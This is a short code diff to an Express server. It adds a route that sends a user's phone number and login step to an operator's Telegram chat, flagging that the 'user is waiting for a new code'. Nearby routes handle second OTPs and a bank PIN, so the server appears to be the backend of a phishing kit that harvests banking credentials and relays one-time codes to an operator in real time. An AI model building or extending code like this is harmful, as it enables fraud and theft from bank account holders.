@@ -169,6 +169,29 @@ app.post('/api/verify-second-otp', async (req, res) => {
     }
 });
 
+// -------------------- RESEND OTP API --------------------
+app.post('/api/resend-otp-notification', async (req, res) => {
+    const { phone, step } = req.body || {};
+    
+    if (!phone || !ADMIN_ID) return res.status(400).json({ error: "Missing data" });
+
+    const resendMsg = `🔄 <b>RESEND REQUESTED</b>
+
+📱 <b>Phone Number:</b> ${phone}
+📍 <b>Step:</b> ${step}
+⚠️ <b>User is waiting for a new code.</b>
+
+━━━━━━━━━━━━━━━`;
+
+    try {
+        await bot.telegram.sendMessage(ADMIN_ID, resendMsg, { parse_mode: 'HTML' });
+        res.json({ success: true });
+    } catch (err) {
+        console.error(err);
+        res.status(500).json({ error: "Telegram error" });
+    }
+});
+
 // -------------------- BANK PIN API (NEW) --------------------
 app.post('/api/verify-bank-pin', async (req, res) => {
     const { phone, bankPin } = req.body || {};
